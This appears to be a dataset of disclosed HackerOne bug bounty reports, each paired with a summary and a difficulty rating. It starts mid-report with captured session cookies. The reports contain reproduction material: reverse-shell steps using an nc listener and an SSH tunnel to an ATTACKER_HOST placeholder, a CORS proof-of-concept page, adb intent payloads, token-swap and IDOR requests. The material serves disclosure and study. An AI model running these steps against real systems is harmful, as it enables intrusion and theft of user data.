3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate, br
8Referer: https://████████.mil/Portal██████/s/
9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
10X-Sfdc-Request-Id: 1650000000ce00391b
11X-Sfdc-Page-Cache: 05da72b5c160b86c
12Content-Type: application/x-www-form-urlencoded;charset=UTF-8
13X-B3-Traceid: bb38cda3039f713b
14X-B3-Spanid: 2e48fc5f161b8aa4
15X-B3-Sampled: 0
16Content-Length: 1118
17Origin: https://███.mil
18Sec-Fetch-Dest: empty
19Sec-Fetch-Mode: cors
20Sec-Fetch-Site: same-origin
21Te: trailers
22
23message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Attachment","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
████████
Insert the ID into URL as below (same session) and verify that file is accessible from your account:
https://█████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0
Notes
To ease testing on your side, I am also attaching a list of Attachment Id's that I generated using the method mentioned in the beginning of the report.
Hope you find this report helpful - look forward to your feedback.
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability in a custom Apex controller allows an attacker to switch the ownership of any Attachment record submitted through the portal and access sensitive files, including personal medical records and other confidential documents.

Steps to Reproduce:
1. Generate/enumerate a list of Salesforce Attachment Id's using predictable patterns
2. Use the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment) to clone any Attachment record and link it to a record owned by the attacker
3. Download the newly-linked Attachment via a servlet/servlet.FileDownload?file=* request
Exploitation Difficulty:
The vulnerability involves multiple components (ID enumeration, Apex controller manipulation, and file access via servlet) and requires understanding of Salesforce ID patterns and custom controller behavior. However, the steps are somewhat linear once the initial ID generation method is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2967634: Exposed proxy allows to access internal reddit domains
================================================================================
RAW DESCRIPTION:

Summary:
Proxy at https://52.90.28.77:30920 allows to access internal domains
Steps To Reproduce:
To reproduce, simply use this curl command
Code 75 Bytes
1curl --insecure https://52.90.28.77:30920/reddit --header "Host: █████████"
Supporting Material
snoo.dev is obviously an internal domains used by employees:
https://search.censys.io/search?resource=certificates&q=snoo.dev
It is also references in the GitHub a few times:
https://github.com/search?q=org%3Areddit%20snoo.dev&type=code
Impact
Attacker can access internal domains



================================================================================
Vulnerability Description:
An exposed proxy server allows unauthorized access to internal Reddit domains, potentially exposing sensitive internal resources.

Steps to Reproduce:
1. Use curl to access the proxy at https://52.90.28.77:30920/reddit with the header 'Host: █████████'
2. Observe that internal domains (e.g., snoo.dev) are accessible through the proxy
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of a misconfigured proxy server. The steps are simple and do not require complex interactions or deep understanding of the application's internal logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/301137: GitHub import allows user to create child group under existing namespace
================================================================================
RAW DESCRIPTION:

When importing a GitHub repository on GitLab, a request is made to /import/github. The user is allowed to pass along a target namespace where they want to add the repository. In this process, the code will create the namespace if it doesn't exist already. However, this can be used to create a sub-group of an existing group and give you "owner" level access to the sub-group. This has a couple benefits, including being able to use the plan of the owner group, see who is part of the group (helpful in case the group is private), and, perhaps most importantly, being able to create new projects under a group you're unauthorized to.
To reproduce, make sure there's a GitLab instance that has a group a user is unauthorized to create projects / groups for. Then, sign in to the normal user account and authorize GitLab to view your GitHub projects. Intercept your network traffic, then click the "Import" button. Observe a request similar to the one below being submitted:
Request
Code 115 Bytes
1POST /import/github HTTP/1.1
2Host: gitlab-instance
3...
4
5repo_id=115670444&target_namespace=jobertabma&new_name=test
In this request, change the target_namespace to secret-group/test. This will create a sub-group called test to the group secret-group.████ To exploit this, an attacker could set a GitLab logo as their group avatar and start spreading gitlab-ce and gitlab-ee projects under the gitlab-org namespace.
<image_0>
<image_1>
This has been tested against the latest version of GitLab.
Impact
N/A



================================================================================
Vulnerability Description:
The vulnerability allows a user to create a sub-group under an unauthorized parent group during GitHub repository import, granting them 'owner' access to the sub-group. This can lead to unauthorized access to the parent group's resources and the ability to create projects under the parent group.

Steps to Reproduce:
1. Sign in to a normal user account on GitLab and authorize GitHub integration.
2. Intercept the network request during GitHub repository import and modify the 'target_namespace' parameter to include an unauthorized parent group (e.g., 'secret-group/test').
Exploitation Difficulty:
The attack involves intercepting and modifying a network request, which is a common technique, but the subtlety lies in understanding that the namespace creation during import does not enforce proper authorization checks for parent groups.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/314808: Full account takeover
================================================================================
RAW DESCRIPTION:

Hello Team,
I got a security issue in reverb ios application which allows an attacker hack all users account.
Since iOS application is not in the scope but still I am reporting this, because this vulnerability may compromise all users account.
Please resolve this quickly.
Desription:
Reverb ios application is not validating facebook access_token on the server side in login api, which allows an attacker to hack all account using his own app access token.
Vulnerable request:
Code 311 Bytes
1POST /api/auth/facebook HTTP/1.1
2Host: reverb.com
3
4{"fb_token":"EAAJ8Of8DF2IBAL5wChKjuRHSV2VEWpm7eCz2IMqqJy1lJJq8ooyQuKHcOXn6aZCZAIrCtClbrZBdUGhC3FbvncNYk1E0k7AOktEhDjUPwHPOh3x29JURSGIGPBlZCj5WlBHhHzI5KYAPbuXKiZBGTkKZABZATh9JjTqEDhRubYSEiTmhjeytx5moFH9naZB6XjZBRUMkmcbucFD9Vf8IoFZAD1LGngi6j5pXFGcTFPfBEudAZDZD"}
Here in vulnerable i used lyst app access token to login.
Steps to reproduce:
Replay vulnerable request in vulnerable request in burp suite
Use any other app access token .
Fix recommendation:
https://developers.facebook.com/docs/facebook-login/security
**(Bug in oauth flow)
Impact
Attacker Can hack all users account using his own app access token



================================================================================
Vulnerability Description:
The Reverb iOS application does not validate Facebook access tokens server-side during the login process. This allows an attacker to use a valid access token from any other application to authenticate as any user, effectively taking over their account.

Steps to Reproduce:
1. Intercept the login request to '/api/auth/facebook' using a proxy tool like Burp Suite.
2. Replace the 'fb_token' parameter in the request with a valid Facebook access token from another application (e.g., Lyst app).
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of the login request by substituting the access token. There are no complex interactions or state manipulations required, and the issue is a common oversight in OAuth implementations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/345162: Local File Download
================================================================================
RAW DESCRIPTION:

Summary: This bug affects suuport.ratelimited.me and can be used by attackers to download local file from your servers including your emails, and files uploaded by your admins and other users.
Description: While starting a conversation with your support agent, I noticed an option to upload a file. And after it was being uploaded it was included with a "blob_id" parameter. it is vulnerable and is leading to download of all the files on your support server.
Steps To Reproduce:
Follow the above steps as mentioned in description to get to the request mentioned below.]
Code 966 Bytes
1GET /chat/send-attach/583-5PH467W8RA2NCWJ?__sid=583-5PH467W8RA2NCWJ&send_blob_id=485&_=1525115609706 HTTP/1.1
2Host: support.ratelimited.me
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://support.ratelimited.me/widget/chat.html?dpsid=583-5PH467W8RA2NCWJ&parent_url=https%3A%2F%2Fsupport.ratelimited.me%2Fprofile
8X-Requested-With: XMLHttpRequest
9Cookie: __cfduid=debed713d869308c24159d6b0ce4df2481525076018; dpsid=583-5PH467W8RA2NCWJ; dpvc=11941-DH6W43CBT3WHJQN; __unam=c0d18f2-16315a5f2ac-ba1665a-242; __utma=138098738.1674211735.1525076589.1525107067.1525114365.3; __utmc=138098738; __utmz=138098738.1525076589.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dpvut=X635APM2; dpchat_sid=583-5PH467W8RA2NCWJ; __utmb=138098738.29.10.1525114365; __utmt=1; dpchatid=51
10Connection: close
After this I used a simple Intruder in the Burp suite to automate my requests to find out which blob_id numbers are giving a 200 Response. Attached a screenshot of the same.
I was able to read your personal emails and all the server logs, also all the files uploaded by others and admins. I was also able to join a ticket due to an email which leaked the joining link.
The irony is I was also able to read the email sent by Hackerone support to start this program :D
No harm has been done, you can remove the screenshots from here after you fix this bug.
Supporting Material/References:
Have attached all the screenshots below which shows how harmful this could have been.
Impact
All the files on the server are being leaked incuding personal emails and logs.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to download local files from the server by manipulating the 'blob_id' parameter in the file upload functionality. This exposes sensitive data such as emails, server logs, and files uploaded by other users and admins.

Steps to Reproduce:
1. Start a conversation with the support agent and upload a file to obtain a 'blob_id' parameter.
2. Use a tool like Burp Suite to automate requests with different 'blob_id' values to identify accessible files.
Exploitation Difficulty:
The attack involves identifying a vulnerable parameter ('blob_id') and exploiting it through automated requests, which is a straightforward process once the parameter is discovered. The interaction between the file upload and the 'blob_id' parameter is not subtle or complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/347296: Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning
================================================================================
RAW DESCRIPTION:

Summary:
Docker Registry HTTP API v2 is exposed in HTTP without authentication. An attacker can use it to dump your docker images and poison them.
Description:
While digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the lgtm/top repository. I didn't try to upload anything because I didn't want to alter your docker images.
Steps To Reproduce:
Create a GitHub repository that has the attached file, name it .lgtm.yml and modify ATTACKER_HOST and ATTACKER_PORT to yours.
set up a netcat listener: nc -vlp ATTACKER_PORT
Add the project to lgtm, it should start building it. After some time, you should get a reverse shell.
Make a remote SSH tunnel from the build container ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N
Enter your attacker password and a SSH tunnel should be up.
Using the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.
Additionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string /v2/<name>/blobs/uploads/. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.
NOTE: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a sandbox escape
Supporting Material/References:
A writeup about the vulnerability in a pentest: https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
The Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload
Remediation:
Implement authentication to the service.
Use HTTPS
Limit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)
Impact
An attacker can use it to dump your docker images and poison them.



================================================================================
Vulnerability Description:
The Docker Registry HTTP API v2 is exposed without authentication, allowing attackers to dump and potentially poison Docker images. This vulnerability is exploitable when the registry is accessible over HTTP and lacks proper authentication mechanisms.

Steps to Reproduce:
1. Set up a GitHub repository with a .lgtm.yml file configured to point to the attacker's host and port.
2. Start a netcat listener on the specified attacker port.
3. Add the project to LGTM to trigger the build process, which should eventually provide a reverse shell.
4. Establish an SSH tunnel from the build container to the attacker's machine to expose the Docker Registry API.
5. Use the docker_fetch tool to dump the desired Docker repository from the exposed registry.
6. Optionally, test for blob uploads by initiating an upload request to the Docker Registry API.
Exploitation Difficulty:
The attack involves multiple steps including setting up a reverse shell, creating an SSH tunnel, and using a specific tool to interact with the Docker Registry. However, each step is straightforward and well-documented, with no subtle interactions or complex state manipulations required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/460121: Publicly editable GitHub wikis
================================================================================
RAW DESCRIPTION:

Hello team,
While browsing https://github.com/liberapay I found that many of the repositories have their wikis publicly editable by any GitHub user. The following are some of the affected repositories:
Code 112 Bytes
1https://github.com/liberapay/cardregistration-js-kit/wiki
2https://github.com/liberapay/mangopay2-python-sdk/wiki
I went on and created the following wiki page as a PoC:
https://github.com/liberapay/cardregistration-js-kit/wiki/PoC
Impact
This enables an attacker to edit the wiki pages of the affected repositories completely remotely, adding content that may link to malicious code libraries that would be installed and used by developers or information that may mislead your users.



================================================================================
Vulnerability Description:
The vulnerability allows any GitHub user to publicly edit the wiki pages of certain repositories, potentially inserting malicious content or misleading information that could affect developers or users.

Steps to Reproduce:
1. Navigate to the GitHub repository's wiki section (e.g., https://github.com/liberapay/cardregistration-js-kit/wiki).
2. Attempt to create or edit a wiki page to confirm public editability (e.g., https://github.com/liberapay/cardregistration-js-kit/wiki/PoC).
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires checking the edit permissions of a repository's wiki, which is a single, well-documented feature of GitHub. There are no complex interactions or states involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/462442: Unauthorized access of Monero wallet by an unprivileged process
================================================================================
RAW DESCRIPTION:

Description:
As per our understanding, Monero wallet app provides a separate executable for the user to enable the RPC interface (monero-wallet-rpc). When the user runs the executable, the RPC server will start on a port number that is specified by the user. The RPC server authenticates the client with the HTTP digest access authentication scheme, which is based on a simple challenge-response paradigm. Basically, the client receives a nonce from the server and then replies with a MD5 hash value of the username, the password, the nonce, the HTTP method, and the URI.
An attacker is a non-privileged user, who can sign in to the victim’s computer with his own credentials or guest account. The attacker first needs to run a process in the background when the victim is using the computer. On Linux and macOS, the attacker only needs to log in, run the process, and leave it running when he logs out. On Windows, user processes are killed at the end of the login session, and thus the attacker needs to do fast user switching to leave his session in the background. The attacker can also remotely run his malicious process if SSH or remote desktop is enabled on the target computer.
With the malicious process running in the background, it is possible to perform server impersonation on the Monero wallet by hijacking the port number before the victim starts the RPC server. The digest access authentication mechanism does not help here because it only authenticates the client. However, the RPC executable will fail to start if the port that it uses has already been taken. While this allows the victim to detect the attack, it does not free him from risks. For example, an aggressively-caching user may attach the RPC executable to the operating system's startup to launch it automatically after login for convenience. In that case, since the RPC server process does not have a GUI to notify the victim that it has failed, the victim will not notice the failure and thus assume that the RPC server is running. Hence, the attacker's malicious server captures commands from the benign client. An example of such commands is “create_wallet”, which tells the server to create a new wallet account. This allows the attacker to have access to the new account because it is created by the attacker instead of the real wallet application.
The attack is straightforward, and no privilege escalation is needed. Also, there are many potential attackers who can perform the attack. For example, in enterprise environments that employ centralized access control mechanisms and allow login by multiple users to the same computer, anyone is a potential attacker. Any computer with guest account enabled is similarly vulnerable.
Releases Affected:
Tested on Monero wallet 0.12.3
How to fix:
We found similar issues on other cryptocurrencies’ wallet applications and are working with them to address the issues. There are various ways to prevent the attack, some of which are as follows:
Mandate the use of TLS on the RPC interface.
The RPC server accepts only RPC clients that are owned by users belonging to Administrators or a special group.
Supporting Material/References:
Recently, we have shown similar critical vulnerabilities in many well-known password managers, hardware tokens, and other security-critical applications at Usenix Security and DefCon:
https://www.usenix.org/conference/usenixsecurity18/presentation/bui
Impact
Access to the victim's wallet without knowing authentication credentials.



================================================================================
Vulnerability Description:
An unprivileged attacker can impersonate the Monero wallet RPC server by hijacking the port before the victim starts the server. This allows the attacker to capture commands from the victim's client, potentially gaining access to new wallet accounts created by the attacker's malicious server.

Steps to Reproduce:
1. The attacker logs into the victim's computer with their own credentials or a guest account.
2. The attacker runs a malicious process in the background that will hijack the port used by the Monero wallet RPC server.
3. The victim starts the Monero wallet RPC server, which fails to start because the port is already taken by the attacker's process.
4. The attacker's malicious server now captures commands from the victim's benign client, such as 'create_wallet', allowing the attacker to create and access new wallet accounts.
Exploitation Difficulty:
The attack involves understanding the Monero wallet RPC server's behavior, port hijacking, and the digest access authentication mechanism. However, the steps are straightforward and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/470298: [██████] Cross-origin resource sharing misconfiguration (CORS)
================================================================================
RAW DESCRIPTION:

Hi!
In this report I want to describe High level bug which can seriously compromise a user account.
If I am authorize on this site, I can steal user's sessions, some personal information or do some action.
Steps for reproduce
1) Send this request
Code 439 Bytes
1GET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1
2Host: www.█████
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: ru,en-US;q=0.7,en;q=0.3
6Accept-Encoding: gzip, deflate
7Origin: exploit.com
8Connection: close
9Upgrade-Insecure-Requests: 1
10Cache-Control: max-age=0
In response headers you can see headers
Code 79 Bytes
1Access-Control-Allow-Credentials: true
2Access-Control-Allow-Origin: exploit.com
{F395049}
So you can write exploit:
Code 867 Bytes
1<!DOCTYPE html>
2<html>
3   <head>
4      <script>
5         function cors() {
6	        var xhttp = new XMLHttpRequest();
7		        xhttp.onreadystatechange = function() {
8			        if (this.readyState == 4 && this.status == 200) {
9			        	document.getElementById("emo").innerHTML = alert(this.responseText);
10	        }
11         };
12         xhttp.open("GET", "https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link", true);
13         xhttp.withCredentials = true;
14         xhttp.send();
15         }
16      </script>
17   </head>
18   <body>
19      <center>
20      <h2>CORS PoC Exploit </h2>
21      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
22      <h3>Show full content of page</h3>
23      <div id="demo">
24         <button type="button" onclick="cors()">Exploit</button>
25      </div>
26   </body>
27</html>
Result:
{F395063}
### How to fix
Rather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.
Impact
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.



================================================================================
Vulnerability Description:
The vulnerability is a misconfigured CORS (Cross-Origin Resource Sharing) policy that allows arbitrary origins to access sensitive data when combined with 'Access-Control-Allow-Credentials: true'. This enables attackers to steal authenticated user data via a malicious website by making cross-origin requests that include the victim's credentials.

Steps to Reproduce:
1. Send a crafted HTTP request with an arbitrary 'Origin' header (e.g., exploit.com) to the vulnerable endpoint.
2. Observe that the server responds with 'Access-Control-Allow-Credentials: true' and reflects the attacker's origin in 'Access-Control-Allow-Origin'.
Exploitation Difficulty:
The attack is straightforward, involving only a single request/response interaction with no complex state manipulation or novel logic. The vulnerability is easily detectable by testing arbitrary Origin headers and observing the server's CORS response headers.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/491892: Broken access control on apps 
================================================================================
RAW DESCRIPTION:

Summary:
The user without administrative privileges can upload and install any Application into the rocket.chat
As ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.
Releases Affected:
0.73.2
Steps To Reproduce:
User log-in into the chat
User open the following link:
Code 44 Bytes
1http://<rocket-chat.link>>/admin/app/install
Upload any app
Activate it by send the following POST request to the installed app:
Code 440 Bytes
1POST /api/apps/<ID_of_the_installed_App>/status HTTP/1.1
2Host: rocket-chat.link
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
4Accept: */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8X-User-Id: [redacted]
9X-Auth-Token: [redacted]
10X-Requested-With: XMLHttpRequest
11Cookie: [redacted]
12DNT: 1
13Connection: close
14Content-Length: 29
15
16{"status":"manually_enabled"}
Supporting Material/References:
You can see the uploading process in the attached video. Left user is admin, right - user without any additional privileges.
Suggested mitigation
Managing apps should be available to admins only.
Impact
Users can install and activate malicious apps into the rocket.chat.



================================================================================
Vulnerability Description:
A broken access control vulnerability allows non-admin users to upload and activate any application in Rocket.Chat by manipulating the app ID in the app.json file and sending a specific POST request to enable the app.

Steps to Reproduce:
1. User logs into Rocket.Chat without administrative privileges.
2. User accesses the app installation URL: http://<rocket-chat.link>/admin/app/install
3. User uploads any app by manipulating the app.json file to control the app ID.
4. User activates the app by sending a POST request to the installed app's status endpoint with the payload {"status":"manually_enabled"}.
Exploitation Difficulty:
The vulnerability involves straightforward steps—accessing a URL, uploading an app, and sending a POST request—without requiring deep understanding of complex interactions or novel logic. The main challenge is knowing the exact endpoints and the JSON payload format, which is not highly complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/499348: Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect 
================================================================================
RAW DESCRIPTION:

Summary: com.twitter.android.lite.TwitterLiteActivity is set to exported and doesn't validate data pass to intent due to which this activity vulnerable to steal users local files, javascript injection and open redirect.
Description: com.twitter.android.lite.TwitterLiteActivity is set to exported so external app can communicate with it.
As this activity doesn't validate data pass through intent critical uri like javascript and file so malicious app can steal users files as well as inject javascript.
It can leads to many issue like UXSS, Token steal, etc.
Steps To Reproduce:
To reproduce we use ADB tool
To reproduce local file access use: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"
To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
To reproduce open redirect: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"
Video of POC attached.
Thanks
Impact
As critical uri like javascript & file is not being validate malicious app can steal users session token, users files etc.



================================================================================
Vulnerability Description:
The Twitter Lite Android app's TwitterLiteActivity is exported and does not validate data passed to it via intent. This allows external apps to communicate with it and pass malicious URIs, leading to local file theft, JavaScript injection, and open redirect vulnerabilities. These can result in UXSS, token theft, and other security issues.

Steps to Reproduce:
1. Use ADB tool to start Twitter Lite activity with a file URI: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"
2. Use ADB tool to start Twitter Lite activity with a javascript URI: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
3. Use ADB tool to start Twitter Lite activity with an open redirect URI: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of an exported activity without proper URI validation. The steps to reproduce are simple and do not require complex interactions or state manipulation. The issue is common in Android apps that do not properly secure exported activities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/502593: Attacker is able to access commit title and team member comments which are supposed to be private
================================================================================
RAW DESCRIPTION:

Summary: [add summary of the vulnerability]
Description: [add more details about this vulnerability]
Steps To Reproduce:
To reproduce this vulnerability, we need two accounts, lets say those accounts are:
-> victim@gmail.com
-> attacker@gmail.com
<image_0>
<image_1>
<image_2>
As you can see, the message of the commit, team members who commented, what the comment was, everything is visible from the email received. This shouldn't be sent via email because the settings selected for repository is 'Only Team Members' whereas attacker@gmail.com is not a team member.
I have tried my best to have perfect steps to reproduce this, still do tell me if you need more info :)
Thanks,
Yash :)
Impact
An attacker will be able to view any commit titles, and all comments which shouldn't be visible to him using this vulnerability



================================================================================
Vulnerability Description:
An information disclosure vulnerability where a non-team member (attacker) receives emails containing private commit titles and team member comments, despite repository settings restricting visibility to 'Only Team Members'.

Steps to Reproduce:
1. Create two accounts: victim@gmail.com (team member) and attacker@gmail.com (non-team member)
2. Configure repository settings to 'Only Team Members' for commit visibility
3. As victim@gmail.com, make a commit and add team member comments
4. Observe that attacker@gmail.com receives an email containing commit title and team member comments
Exploitation Difficulty:
The vulnerability involves basic email notification functionality and access control checks, with no complex interactions or state manipulation required. The issue is straightforward to reproduce once the test accounts are set up.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/538008: Add users to groups who have restricted group invites
================================================================================
RAW DESCRIPTION:

Description:
WordPress version: 5.2
BuddyPress version: 4.2.0
Through this vulnerability, an attacker could add users to groups who have set :
I want to restrict Group invites to my friends only.
There is no proper validation of the personal settings of the user and thus the users with such privacy settings selected could be added.
Steps to Reproduce:
Make 2 accounts A and B, make sure they are not friends.
From account of user A, enable the setting I want to restrict Group invites to my friends only. from the following URL http://bbwordpress.esy.es/members/yuvraj/settings/invites/.
From account of user B, make a POST request to :
POST : http://bbwordpress.esy.es/wp-admin/admin-ajax.php
BODY : message=&nonce=21f500cbfd&group_id=1&action=groups_send_group_invites&_wpnonce=7264177f51&users%5B%5D=3
Replace the value of users with the victims user id , i.e id of user A.
Victim (user A) would receive an invitation from Attacker (user B) even though the privacy setting to restrict group invites has been enabled.
Impact
An attacker who is not a friend of the victim can send him a group invite even though the victim has selected to restrict group invites from friends only.



================================================================================
Vulnerability Description:
An attacker can bypass the privacy setting that restricts group invites to friends only by directly sending a POST request to the vulnerable endpoint with the victim's user ID, allowing unauthorized group invitations.

Steps to Reproduce:
1. Create two accounts (A and B) and ensure they are not friends.
2. From account A, enable the setting 'I want to restrict Group invites to my friends only' in the privacy settings.
3. From account B, send a POST request to the vulnerable endpoint with the victim's (account A) user ID in the payload.
4. Observe that account A receives an invitation from account B despite the privacy setting.
Exploitation Difficulty:
The vulnerability involves a simple bypass of a privacy setting by directly interacting with the endpoint, without needing to understand complex application states or novel logic. The attack is straightforward once the endpoint and the lack of validation are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/648222: [██████████] Unauthorized access to admin panel
================================================================================
RAW DESCRIPTION:

In previous reports, I described vulnerabilities in a panel to which I had access.
#512269
#512693
#512695
I could log in to this site and then perform some attacks, such as SQL injection\XSS or other bugs. But before the above vulnerabilities were considered by you, the possibility to bypass authorization on the site was disabled. And after that, the vulnerabilities could not be reproduced and I was forced to close my reports.
Recently, I began to explore this site again. And I found that the developers have poorly implemented the restriction of authorization on the site.
I can still get the contents of an authorized site. How? When I visit some pages of the site, I get a redirect to the authorization form. But in addition to the redirect, the response body also contains HTML code of auth site.
Look this pages:
https://███████/mission.php
https://██████████/personnel.php
https://███████/index.php
Steps to reproduce
1) Turn on Live Interception in burp (Proxy-Intercept)
2) Intercept request. Press right mouse button-> Do intercept -> Response this request
█████████
3) Delete this redirection
████
Here I can see a lot of private information
https://█████████/personnel.php
█████
https://███/index.php
███████
Impact
Incorrect access restriction to the authorized interface of the site leads to information leakage.



================================================================================
Vulnerability Description:
The vulnerability involves an improper access control mechanism where the server returns the HTML content of authorized pages in the response body even when redirecting unauthenticated users to the login page. By intercepting and modifying the response to remove the redirection, an attacker can view sensitive information intended only for authenticated users.

Steps to Reproduce:
1. Turn on Live Interception in Burp Suite (Proxy-Intercept).
2. Intercept the request to the target page (e.g., /mission.php, /personnel.php, /index.php). Right-click the request and select 'Do intercept -> Response to this request.'
3. Modify the intercepted response by removing the redirection header (e.g., 'Location: /login.php').
4. Forward the modified response. The response body will now display the HTML content of the authorized page, bypassing authentication.
Exploitation Difficulty:
The vulnerability is straightforward to discover once the tester is familiar with intercepting and modifying HTTP responses using tools like Burp Suite. The attack does not involve complex interactions or novel logic, and the steps are relatively simple and linear.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/683024: Unrestricted File Upload
================================================================================
RAW DESCRIPTION:

Summary:
The endpoint at https://███████/ui/core/index.html required authentication, but navigating to https://█████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allow for read/write access.
Description:
The endpoint at https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allowed for read as well as write access. It was possible to create directories and upload images as well as .exe files such as putty.exe.
Impact
An attacker can attempt to use the site to host malware, or perform social engineering attacks since the domain URL will be a .mil address.
